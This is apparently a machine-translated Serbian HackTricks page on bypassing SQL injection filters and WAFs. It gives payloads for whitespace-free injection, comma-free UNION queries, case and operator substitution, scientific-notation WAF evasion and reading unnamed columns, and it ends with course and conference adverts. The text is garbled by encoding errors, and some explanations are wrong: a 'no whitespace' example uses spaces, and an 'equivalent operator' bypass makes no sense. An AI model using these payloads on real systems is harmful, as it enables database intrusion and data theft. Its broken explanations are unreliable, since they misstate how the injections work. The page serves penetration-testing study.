No Whitespace (bez razmaka) tehnika zaobilaÅ¾enja se koristi kada je unos korisnika filtriran tako da ne dozvoljava upotrebu razmaka. Ova tehnika koristi SQL komentare kako bi se zaobiÅ¡ao taj filter.

### Napadni vektor

NapadaÄ moÅ¾e iskoristiti ovu tehniku kada je unos korisnika ograniÄen i ne dozvoljava koriÅ¡Ä‡enje razmaka.

### Napadni scenario

NapadaÄ moÅ¾e koristiti SQL komentare (`/* */` ili `--`) kako bi zaobiÅ¡ao ograniÄenje razmaka i ubacio SQL kod.

Na primer, ako je unos korisnika ograniÄen i ne dozvoljava razmake, napadaÄ moÅ¾e koristiti sledeÄ‡i napadni vektor:

```
'/**/UNION/**/SELECT/**/1,2,3-- -
```

Ovaj napadni vektor koristi SQL komentare (`/**/`) kako bi se zaobiÅ¡lo ograniÄenje razmaka i ubacio SQL kod `UNION SELECT 1,2,3`.

### Prevencija

Da bi se spreÄio ovaj tip napada, potrebno je pravilno filtrirati i validirati korisniÄki unos. TakoÄ‘e, preporuÄuje se koriÅ¡Ä‡enje parametrizovanih upita ili ORM alata koji automatski sanitizuju korisniÄki unos.
```sql
?id=1/*comment*/and/**/1=1/**/--
```
## No Whitespace - zaobilaÅ¾enje koriÅ¡Ä‡enjem zagrada

### Opis

No Whitespace (bez razmaka) tehnika zaobilaÅ¾enja koristi se za izvrÅ¡avanje SQL injekcije kada je unos korisnika ograniÄen tako da ne dozvoljava koriÅ¡Ä‡enje razmaka. Ova tehnika koristi zagrade kako bi se zaobiÅ¡ao taj ograniÄenje i omoguÄ‡ilo izvrÅ¡avanje SQL upita.

### Napadni vektor

NapadaÄ moÅ¾e iskoristiti ovu tehniku kada je unos korisnika ograniÄen i ne dozvoljava koriÅ¡Ä‡enje razmaka.

### Primer

Pretpostavimo da je SQL upit koji se izvrÅ¡ava na serveru sledeÄ‡i:

```sql
SELECT * FROM users WHERE username='admin' AND password='password'
```

NapadaÄ moÅ¾e iskoristiti No Whitespace tehniku zaobilaÅ¾enja koristeÄ‡i sledeÄ‡i unos:

```
admin') OR ('a'='a
```

Kada se ovaj unos ubaci u SQL upit, rezultujuÄ‡i upit Ä‡e izgledati ovako:

```sql
SELECT * FROM users WHERE username='admin') OR ('a'='a' AND password='password'
```

Na ovaj naÄin, napadaÄ je uspeÅ¡no zaobiÅ¡ao ograniÄenje bez razmaka i izvrÅ¡io SQL injekciju.

### Prevencija

Da bi se spreÄila No Whitespace SQL injekcija, preporuÄuje se koriÅ¡Ä‡enje parametrizovanih upita ili sanitizacija korisniÄkog unosa. TakoÄ‘e, vaÅ¾no je redovno aÅ¾urirati softver i primenjivati sigurnosne zakrpe kako bi se smanjio rizik od SQL injekcija.
```sql
?id=(1)and(1)=(1)--
```
### Bypass bez zareza

Bypass bez zareza - koriÅ¡Ä‡enje OFFSET, FROM i JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### GeneriÄki zaobilazi

Crna lista koriÅ¡Ä‡enjem kljuÄnih reÄi - zaobilaÅ¾enje koriÅ¡Ä‡enjem velikih/malih slova
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Crna lista koriÅ¡Ä‡enjem kljuÄnih reÄi bez obzira na veliÄinu slova - zaobilaÅ¾enje koriÅ¡Ä‡enjem ekvivalentnog operatora

UobiÄajena metoda za spreÄavanje SQL injection napada je koriÅ¡Ä‡enje crne liste kljuÄnih reÄi. MeÄ‘utim, ova metoda Äesto ne uzima u obzir veliÄinu slova, Å¡to omoguÄ‡ava napadaÄima da zaobiÄ‘u zaÅ¡titu.

Na primer, ako je kljuÄna reÄ "admin" na crnoj listi, napadaÄ moÅ¾e da umetne "ADMIN" ili "AdMiN" kako bi izbegao detekciju. MeÄ‘utim, postoji naÄin da se zaobiÄ‘e ovakva zaÅ¡tita koriÅ¡Ä‡enjem ekvivalentnog operatora.

Umesto da koristite kljuÄnu reÄ direktno, moÅ¾ete koristiti ekvivalentni operator koji Ä‡e izvrÅ¡iti istu funkciju. Na primer, umesto da koristite "admin", moÅ¾ete koristiti "1=1", Å¡to je uvek taÄno. Na taj naÄin, SQL upit Ä‡e biti izvrÅ¡en bez obzira na crnu listu kljuÄnih reÄi.

Na primer, umesto:

```
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```

MoÅ¾ete koristiti:

```
SELECT * FROM users WHERE username = '1=1' AND password = 'password';
```

Na ovaj naÄin, SQL upit Ä‡e biti izvrÅ¡en bez obzira na to da li je kljuÄna reÄ "admin" na crnoj listi ili ne.
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bypassiranje WAF-a pomoÄ‡u nauÄne notacije

MoÅ¾ete pronaÄ‡i detaljnije objaÅ¡njenje ove tehnike u [gosecure blogu](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
U osnovi, moÅ¾ete koristiti nauÄnu notaciju na neoÄekivane naÄine kako biste zaobiÅ¡li WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### ZaobilaÅ¾enje ograniÄenja imena kolona

Prvo, primetite da ako **izvorna upit i tabela iz koje Å¾elite izvuÄ‡i zastavicu imaju isti broj kolona**, moÅ¾ete jednostavno uraditi: `0 UNION SELECT * FROM flag`

MoguÄ‡e je **pristupiti treÄ‡oj koloni tabele bez koriÅ¡Ä‡enja njenog imena** koristeÄ‡i upit poput sledeÄ‡eg: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, pa bi u sluÄaju SQL ubacivanja to izgledalo ovako:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Ili koriÅ¡Ä‡enjem **zaobilaska zareza**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Ova prevara je preuzeta sa [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### Alati za predlaganje zaobilaÅ¾enja WAF-a

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Ostali vodiÄi

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Lista za otkrivanje Brute-Force napada

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



â€‹

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji dogaÄ‘aj u oblasti sajber bezbednosti u **Å paniji** i jedan od najvaÅ¾nijih u **Evropi**. Sa **misijom promovisanja tehniÄkog znanja**, ovaj kongres je vrelo mesto susreta za profesionalce iz oblasti tehnologije i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za sajber bezbednost**? Å½elite li da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks**? Ili Å¾elite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **PridruÅ¾ite se** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
